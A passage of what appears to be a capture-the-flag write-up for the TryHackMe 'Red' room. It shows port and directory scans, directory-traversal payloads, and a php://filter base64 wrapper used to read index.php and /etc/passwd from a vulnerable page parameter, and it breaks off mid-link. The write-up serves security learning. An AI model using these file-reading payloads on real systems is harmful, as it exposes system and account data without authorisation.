@@ -1,0 +1,2070 @@
+---
+title: 'CTF - TryHackMe: Red'
+description: ""
+published: 2023-08-03
+redirect_from: 
+            - http://salucci.ch/2023/08/03/ctf-tryhackme-red/
+categories: "CTF, exploit, LFI, linux, rce, reverse-shell, trustinveritas, tryhackme, Uncategorized, web"
+hero: ./img/wp-content-uploads-2023-08-meme-cyber-1.png
+---
+
+
+### Level: **_Easy_**
+
+
+
+
+
+#### Introduction
+
+
+
+
+
+The match has started, and Red has taken the lead on you.  
+But you are Blue, and only you can take Red down.
+
+
+
+
+
+However, Red has implemented some defense mechanisms that will make the battle a bit difficult:
+
+1. Red has been known to kick adversaries out of the machine. Is there a way around it?
+2. Red likes to change adversaries' passwords but tends to keep them relatively the same.
+3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!
+
+
+
+
+
+This is a unique battle, and if you feel up to the challenge. Then by all means go for it!
+
+
+
+
+
+Thanks to [**tryhackme**](https://tryhackme.com/p/tryhackme) and **[hadrian3689](https://tryhackme.com/p/hadrian3689) **for the room on TryHackMe!
+
+
+
+
+
+---
+
+
+
+
+
+#### Tabel of Content
+
+
+
+
+
+1. [Level: Easy](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#level-easy)
+
+   1. [Introduction](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#introduction)
+
+   2. [Tabel of Content](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#tabel-of-content)
+
+   3. [RECONNAISSANCE](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#reconnaissance)
+
+      1. [RUSTSCAN](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#rustscan)
+      2. [FEROXBUSTER](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#feroxbuster)
+      3. [Some Fun Notes Of The Red Team](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#some-fun-notes-of-the-red-team)
+
+   4. [What do we have so far?](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#what-do-we-have-so-far)
+
+      1. [LFI ( Local File Inclusion )](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#lfi-local-file-inclusion)
+
+   5. [I want to see index.php](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#i-want-to-see-index-php)
+
+      1. [PHP wrapper - Base64](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#php-wrapper-base64)
+      2. [index.php > CyberChef.io](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#index-php-cyberchef-io)
+
+   6. [Let's read some interesting files !](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#let-s-read-some-interesting-files)
+
+      1. [/etc/passwd](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#etc-passwd)
+      2. [CyberChef.io](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#cyberchef-io)
+      3. [/etc/hosts](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#etc-hosts)
+      4. [/proc/version](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#proc-version)
+      5. [/home/blue/.bash_history](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#home-blue-bash-history)
+
+   7. [Let's make passlist.txt](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#let-s-make-passlist-txt)
+
+      1. [Understand What Blue Made here](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#understand-what-blue-made-here)
+      2. [.reminder](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#reminder)
+      3. [HASHCAT](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#hashcat)
+
+   8. [EXPLOITATION](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#exploitation)
+
+      1. [HYDRA - SSH BRUTE FORCE](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#hydra-ssh-brute-force)
+
+   9. [Let's Login to SSH](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#let-s-login-to-ssh)
+
+      1. [FLAG1](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#flag1)
+
+   10. [DISCOVERY](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#discovery)
+
+       1. [linPEAS](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#linpeas)
+       2. [Simple Python HTTP Server](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#simple-python-http-server)
+       3. [On the target machine](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#on-the-target-machine)
+       4. [WAIT WHAT ?!?!?](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#wait-what)
+
+   11. [PERSISTENCE](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#persistence)
+
+       1. [Reverse-SSH-Connection / SSH TUNNELING](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#reverse-ssh-connection-ssh-tunneling)
+       2. [CRACK SSH PASSWORD AGAIN](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#crack-ssh-password-again)
+       3. [LOGIN](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#login)
+       4. [Create a SSH TUNNEL ON PORT 2222](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#create-a-ssh-tunnel-on-port-2222)
+       5. [NOW LOGIN TO THE TUNNEL](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#now-login-to-the-tunnel)
+       6. [A NOTE FROM RED](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#a-note-from-red)
+
+   12. [New Try - With METASPLOIT](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#new-try-with-metasploit)
+
+       1. [CREATE REVERSE SHELL / Meterpreter Staged](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#create-reverse-shell-meterpreter-staged)
+       2. [CREATE LISTENER](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#create-listener)
+       3. [CREATE PERSISTENCE / CRONJOB](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#create-persistence-cronjob)
+
+   13. [DISCOVERY](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#discovery)
+
+       1. [METERPRETER](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#meterpreter)
+       2. [Let's Kill red process](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#let-s-kill-red-process)
+       3. [Let's spawn a shell](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#let-s-spawn-a-shell)
+
+   14. [linPEAS](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#linpeas)
+
+       1. [TRACES FROM RED](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#traces-from-red)
+
+   15. [What can we do?](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#what-can-we-do)
+
+       1. [WHAT IF WE...](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#what-if-we)
+       2. [HERE COMES THE TRICK](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#here-comes-the-trick)
+       3. [NETCAT Listener](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#netcat-listener)
+       4. [FLAG2](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#flag2)
+       5. [CREATE PERSISTENCE](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#create-persistence)
+       6. [START METASPLOIT LISTENER](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#start-metasploit-listener)
+       7. [Make Stable Shell](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#make-stable-shell)
+       8. [List Cronjobs](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#list-cronjobs)
+       9. [Edit Cronjobs](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#edit-cronjobs)
+
+   16. [PRIVILEGE ESCALATION](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#privilege-escalation)
+
+       1. [linPEAS](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#linpeas)
+       2. [GTFOBINS](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#gtfobins)
+       3. [.BASH_HISTORY](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#bash-history)
+       4. [.git](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#git)
+
+   17. [CVE-2021-4034](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#cve-2021-4034)
+
+       1. [EXPLOIT](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#exploit)
+       2. [FLAG3](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#flag3)
+       3. [BONUS](https://salucci.ch/2023/08/03/ctf-tryhackme-red/#bonus)
+
+
+
+
+
+---
+
+
+
+
+
+#### RECONNAISSANCE
+
+
+
+
+
+##### RUSTSCAN
+
+
+
+
+
+```
+<strong>sudo rustscan -a 10.10.212.150 --ulimit 5000 -- -oA scans/ -sC -sV --script vuln,mysql-enum</strong>
+```
+
+
+
+
+
+```
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
+
+[~] The config file is expected to be at "/root/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5000.
+Open 10.10.212.150:<strong>22</strong>
+Open 10.10.212.150:<strong>80</strong>
+
+PORT   STATE SERVICE REASON         VERSION
+<strong>22/tcp open  ssh </strong>    syn-ack ttl 63 <strong>OpenSSH 8.2p1 Ubuntu 4ubuntu0.5</strong> (Ubuntu Linux; protocol 2.0)
+| vulners:
+|   cpe:/a:openbsd:openssh:8.2p1:
+|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
+|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
+|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
+|       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062
+|       CVE-2021-28041  4.6     https://vulners.com/cve/CVE-2021-28041
+|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
+|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
+|       CVE-2016-20012  4.3     https://vulners.com/cve/CVE-2016-20012
+|_      CVE-2021-36368  2.6     https://vulners.com/cve/CVE-2021-36368
+
+<strong>80/tcp open</strong>  http    syn-ack ttl 63 <strong>Apache httpd 2.4.41</strong> ((Ubuntu))
+|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+| vulners:
+|   cpe:/a:apache:http_server:2.4.41:
+|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631     *EXPLOIT*
+|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
+|       CVE-2023-25690  7.5     https://vulners.com/cve/CVE-2023-25690
+|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
+|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
+|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
+|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
+|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
+|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
+|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
+|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
+|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
+|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
+|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    7.5     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
+|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
+|       1337DAY-ID-34882        7.5     https://vulners.com/zdt/1337DAY-ID-34882        *EXPLOIT*
+|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
+|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
+|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
+|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
+|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
+|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
+|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
+|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
+|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
+|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
+|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
+|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+|       CVE-2022-36760  5.1     https://vulners.com/cve/CVE-2022-36760
+|       CVE-2023-27522  5.0     https://vulners.com/cve/CVE-2023-27522
+|       CVE-2022-37436  5.0     https://vulners.com/cve/CVE-2022-37436
+|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
+|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
+|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
+|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
+|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
+|       CVE-2021-36160  5.0     https://vulners.com/cve/CVE-2021-36160
+|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
+|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193
+|       CVE-2021-30641  5.0     https://vulners.com/cve/CVE-2021-30641
+|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
+|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
+|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+|       CVE-2020-13950  5.0     https://vulners.com/cve/CVE-2020-13950
+|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
+|       CVE-2006-20001  5.0     https://vulners.com/cve/CVE-2006-20001
+|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
+|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
+|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
+|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
+|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
+|_      1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+| http-fileupload-exploiter:
+|
+|     Couldn't find a file-type field.
+|
+|_    Couldn't find a file-type field.
+|_http-jsonp-detection: Couldn't find any JSONP endpoints.
+| http-enum:
+|_  /home.html: Possible admin folder
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### FEROXBUSTER
+
+
+
+
+
+```
+<strong>feroxbuster -u http://10.10.212.150/ -w /usr/share/wordlists/dirb/big.txt -d 0 -x php,txt,html,bak,js,docx,pdf,json,bat,cmd,ps1,sh</strong>
+```
+
+
+
+
+
+```
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.212.150/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, txt, html, bak, js, docx, pdf, json, bat, cmd, ps1, sh]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ INFINITE
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+
+302      GET        0l        0w        0c http://10.10.212.150/ => http://10.10.212.150<strong>/index.php?page=home.html</strong>
+200      GET      192l     1032w     9974c http://10.10.212.150/sidebar-right.html
+302      GET        0l        0w        0c http://10.10.212.150/<strong>index.php</strong> => http://10.10.212.150<strong>/index.php?page=home.html</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### Some Fun Notes Of The Red Team
+
+
+
+
+
+```
+> Red was here, Blue is a loser :p
+> At lorem Ipsum available, but the majority have suffered alteration in some form by injected humour.
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### What do we have so far?
+
+
+
+
+
+```
+> Not much, but whats going on with:
+http://10.10.212.150<strong>/index.php?page=home.html</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### LFI ( Local File Inclusion )
+
+
+
+
+
+```
+/index.php?page=<strong>../../../../../../etc/passwd</strong>
+
+/index.php?page=<strong>../../../../../../etc/passwd%00</strong>
+
+/index.php?page=<strong>....//<strong>....//....//....//....//....//</strong>etc//passwd</strong>
+
+/index.php?page=<strong>%2e%2e/%2e%2e/etc%2e%2e/passwd</strong>
+```
+
+
+
+
+
+```
+> Nothing works, we always get redirected to <strong><em>home.html</em></strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### I want to see index.php
+
+
+
+
+
+##### PHP wrapper - Base64
+
+
+
+
+
+```
+php://filter/convert.base64-encode/resource=
+```
+
+
+
+
+
+```
+http://10.10.212.150/index.php?page=<strong>php://filter/convert.base64-encode/resource=index.php</strong>
+```
+
+
+
+
+
+```
+PD9waHAgCgpmdW5jdGlvbiBzYW5pdGl6ZV9pbnB1dCgkcGFyYW0pIHsKICAgICRwYXJhbTEgPSBzdHJfcmVwbGFjZSgiLi4vIiwiIiwkcGFyYW0pOwogICAgJHBhcmFtMiA9IHN0cl9yZXBsYWNlKCIuLyIsIiIsJHBhcmFtMSk7CiAgICByZXR1cm4gJHBhcmFtMjsKfQoKJHBhZ2UgPSAkX0dFVFsncGFnZSddOwppZiAoaXNzZXQoJHBhZ2UpICYmIHByZWdfbWF0Y2goIi9eW2Etel0vIiwgJHBhZ2UpKSB7CiAgICAkcGFnZSA9IHNhbml0aXplX2lucHV0KCRwYWdlKTsKICAgIHJlYWRmaWxlKCRwYWdlKTsKfSBlbHNlIHsKICAgIGhlYWRlcignTG9jYXRpb246IC9pbmRleC5waHA/cGFnZT1ob21lLmh0bWwnKTsKfQoKPz4K
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+![](./img/wp-content-uploads-2023-08-meme-cyber-1.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+##### index.php > [CyberChef.io](<https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=UEQ5d2FIQWdDZ3BtZFc1amRHbHZiaUJ6WVc1cGRHbDZaVjlwYm5CMWRDZ2tjR0Z5WVcwcElIc0tJQ0FnSUNSd1lYSmhiVEVnUFNCemRISmZjbVZ3YkdGalpTZ2lMaTR2SWl3aUlpd2tjR0Z5WVcwcE93b2dJQ0FnSkhCaGNtRnRNaUE5SUhOMGNsOXlaWEJzWVdObEtDSXVMeUlzSWlJc0pIQmhjbUZ0TVNrN0NpQWdJQ0J5WlhSMWNtNGdKSEJoY21GdE1qc0tmUW9LSkhCaFoyVWdQU0FrWDBkRlZGc25jR0ZuWlNkZE93cHBaaUFvYVhOelpYUW9KSEJoWjJVcElDWW1JSEJ5WldkZmJXRjBZMmdvSWk5ZVcyRXRlbDB2SWl3Z0pIQmhaMlVwS1NCN0NpQWdJQ0FrY0dGblpTQTlJSE5oYm1sMGFYcGxYMmx1Y0hWMEtDUndZV2RsS1RzS0lDQWdJSEpsWVdSbWFXeGxLQ1J3WVdkbEtUc0tmU0JsYkhObElIc0tJQ0FnSUdobFlXUmxjaWduVEc5allYUnBiMjQ2SUM5cGJtUmxlQzV3YUhBL2NHRm5aVDFvYjIxbExtaDBiV3duS1RzS2ZRb0tQejRL>)
+
+
+
+
+
+```
+<?php
+
+function <strong>sanitize_input</strong>($param) {
+    $param1 = str_replace("<strong>../</strong>","",$param);
+    $param2 = str_replace("<strong>./</strong>","",$param1);
+    return $param2;
+}
+
+$page = $_GET['page'];
+if (isset($page) && preg_match("/^[a-z]/", $page)) {
+    $page = sanitize_input($page);
+    <strong>readfile</strong>($page);
+} else {
+    <strong>header('Location: /index.php?page=home.html')</strong>;
+}
+
+?>
+```
+
+
+
+
+
+---
+
+
+
+
+
+```
+> That is why it's not working !
+> User Input get's sanitized and redirected to home.html
+> index.php uses the <strong><em>readfile</em></strong> PHP funciton
+```
+
+
+
+
+
+
+
+[PHP function: readfile](https://www.php.net/manual/en/function.readfile.php)
+
+
+
+
+
+
+
+> 
+>
+> **_Reads a file and writes it to the output buffer._**
+>
+> 
+>
+> php.net
+
+
+
+
+
+---
+
+
+
+
+
+#### Let's read some interesting files !
+
+
+
+
+
+##### /etc/passwd
+
+
+
+
+
+```
+/index.php?page=php://filter/convert.base64-encode/resource=<strong>/etc/passwd</strong>
+```
+
+
+
+
+
+```
+cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQp1c2JtdXg6eDoxMTE6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjExMjo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6LzovdXNyL3NiaW4vbm9sb2dpbgpibHVlOng6MTAwMDoxMDAwOmJsdWU6L2hvbWUvYmx1ZTovYmluL2Jhc2gKbHhkOng6OTk4OjEwMDo6L3Zhci9zbmFwL2x4ZC9jb21tb24vbHhkOi9iaW4vZmFsc2UKcmVkOng6MTAwMToxMDAxOjovaG9tZS9yZWQ6L2Jpbi9iYXNoCg==
+```
+
+
+
+
+
+##### [CyberChef.io](<https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=Y205dmREcDRPakE2TURweWIyOTBPaTl5YjI5ME9pOWlhVzR2WW1GemFBcGtZV1Z0YjI0NmVEb3hPakU2WkdGbGJXOXVPaTkxYzNJdmMySnBiam92ZFhOeUwzTmlhVzR2Ym05c2IyZHBiZ3BpYVc0NmVEb3lPakk2WW1sdU9pOWlhVzQ2TDNWemNpOXpZbWx1TDI1dmJHOW5hVzRLYzNsek9uZzZNem96T25ONWN6b3ZaR1YyT2k5MWMzSXZjMkpwYmk5dWIyeHZaMmx1Q25ONWJtTTZlRG8wT2pZMU5UTTBPbk41Ym1NNkwySnBiam92WW1sdUwzTjVibU1LWjJGdFpYTTZlRG8xT2pZd09tZGhiV1Z6T2k5MWMzSXZaMkZ0WlhNNkwzVnpjaTl6WW1sdUwyNXZiRzluYVc0S2JXRnVPbmc2TmpveE1qcHRZVzQ2TDNaaGNpOWpZV05vWlM5dFlXNDZMM1Z6Y2k5elltbHVMMjV2Ykc5bmFXNEtiSEE2ZURvM09qYzZiSEE2TDNaaGNpOXpjRzl2YkM5c2NHUTZMM1Z6Y2k5elltbHVMMjV2Ykc5bmFXNEtiV0ZwYkRwNE9qZzZPRHB0WVdsc09pOTJZWEl2YldGcGJEb3ZkWE55TDNOaWFXNHZibTlzYjJkcGJncHVaWGR6T25nNk9UbzVPbTVsZDNNNkwzWmhjaTl6Y0c5dmJDOXVaWGR6T2k5MWMzSXZjMkpwYmk5dWIyeHZaMmx1Q25WMVkzQTZlRG94TURveE1EcDFkV053T2k5MllYSXZjM0J2YjJ3dmRYVmpjRG92ZFhOeUwzTmlhVzR2Ym05c2IyZHBiZ3B3Y205NGVUcDRPakV6T2pFek9uQnliM2g1T2k5aWFXNDZMM1Z6Y2k5elltbHVMMjV2Ykc5bmFXNEtkM2QzTFdSaGRHRTZlRG96TXpvek16cDNkM2N0WkdGMFlUb3ZkbUZ5TDNkM2R6b3ZkWE55TDNOaWFXNHZibTlzYjJkcGJncGlZV05yZFhBNmVEb3pORG96TkRwaVlXTnJkWEE2TDNaaGNpOWlZV05yZFhCek9pOTFjM0l2YzJKcGJpOXViMnh2WjJsdUNteHBjM1E2ZURvek9Eb3pPRHBOWVdsc2FXNW5JRXhwYzNRZ1RXRnVZV2RsY2pvdmRtRn